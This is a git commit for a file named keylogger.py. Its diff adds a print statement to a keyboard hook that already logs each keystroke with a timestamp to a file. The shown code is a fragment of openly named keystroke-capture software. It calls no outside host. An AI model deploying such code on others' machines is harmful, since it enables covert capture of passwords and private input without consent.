d7b4340795df3a9fc38db2810fd7607948477eb5
Tharun M <138559432+TharunOfficial@users.noreply.github.com>
2024-08-16 14:08:39 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -8,6 +8,7 @@ def on_key_press(event):
     current_time = datetime.datetime.now()
     with open(log_file, 'a') as f:
         f.write('{}->{}\n'.format(current_time,event.name))
+        print('{}->{}\n'.format(current_time,event.name))
 
 keyboard.on_press(on_key_press)
 
